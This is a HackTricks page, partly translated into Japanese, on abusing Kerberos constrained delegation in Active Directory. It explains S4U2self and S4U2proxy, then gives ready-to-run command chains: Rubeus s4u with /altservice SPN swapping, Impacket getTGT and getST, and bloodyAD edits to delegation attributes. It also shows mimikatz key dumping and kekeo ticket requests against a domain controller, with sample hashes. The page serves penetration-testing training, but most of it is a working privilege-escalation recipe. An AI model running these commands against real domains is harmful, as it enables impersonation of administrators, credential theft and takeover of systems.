# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Using this a Domain admin can **allow** a computer to **impersonate a user or computer** against any **service** of a machine.

- **Service for User to self (_S4U2self_):** もし **service account** の _userAccountControl_ 値に [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) が含まれていれば、そのアカウントは任意の他ユーザーに代わって自身（サービス）用の TGS を取得できる。
- **Service for User to Proxy(_S4U2proxy_):** ある **service account** は **msDS-AllowedToDelegateTo** に設定されたサービスに対して任意のユーザーに代わって TGS を取得できる。これを行うにはまずそのユーザーから自分宛ての TGS を得る必要があるが、S4U2self を使って先にその TGS を取得してから別の TGS を要求できる。

**Note**: AD でユーザーが ‘_Account is sensitive and cannot be delegated_’ とマークされている場合、そのユーザーを **impersonate** することはできない。

This means that if you **compromise the hash of the service** you can **impersonate users** and obtain **access** on their behalf to any **service** over the indicated machines (possible **privesc**).

Moreover, you **won't only have access to the service that the user is able to impersonate, but also to any service** because the SPN (the service name requested) is not being checked (in the ticket this part is not encrypted/signed). Therefore, if you have access to **CIFS service** you can also have access to **HOST service** using `/altservice` flag in Rubeus for example. The same SPN swapping weakness is abused by **Impacket getST -altservice** and other tooling.

Also, **LDAP service access on DC**, is what is needed to exploit a **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Cross-domain constrained delegation の注意事項 (2025+)

Windows Server 2012/2012 R2 以降、KDC は S4U2Proxy 拡張を通じてドメイン/フォレスト間での constrained delegation をサポートします。最近のビルド (Windows Server 2016–2025) はこの動作を維持し、プロトコル遷移を示すために 2 つの PAC SIDs を追加します:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) — ユーザーが通常の認証を行った場合。
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) — サービスがプロトコル遷移を介してアイデンティティを主張した場合。

ドメイン間でプロトコル遷移が使用される場合、S4U2Proxy ステップが成功したことを確認するために PAC 内に `SERVICE_ASSERTED_IDENTITY` が含まれていることを期待してください。

### Impacket / Linux tooling (altservice & full S4U)

最近の Impacket (0.11.x+) は Rubeus と同じ S4U チェーンと SPN 交換を実装しています:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
If you prefer forging the user ST first (e.g., offline hash only), pair **ticketer.py** with **getST.py** for S4U2Proxy. See the open Impacket issue #1713 for current quirks (KRB_AP_ERR_MODIFIED when the forged ST doesn't match the SPN key).

### 低権限クレデンシャルからの delegation セットアップの自動化

もし既にコンピュータまたはサービスアカウントに対して **GenericAll/WriteDACL** を持っているなら、**RSAT** を使わずに **bloodyAD**（2024+）で必要な属性をリモートから設定できます:
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
これにより、これらの属性に書き込みができるようになった時点で、DA 権限なしに privesc のための constrained delegation パスを構築できます。

- ステップ 1: **許可されたサービスの TGT を取得する**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> コンピュータ上でSYSTEMでなくても、Printer Bugやunconstrain delegation、NTLM relaying、Active Directory Certificate Service abuseのように、**TGT ticket**や**RC4**や**AES256**を取得する**他の方法**があります
>
> **そのTGT ticket（またはハッシュ化されたもの）を持っているだけで、コンピュータ全体を侵害せずにこの攻撃を実行できます。**

- Step2: **ユーザーをなりすましてサービスのTGSを取得する**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) と [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## 参考資料
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
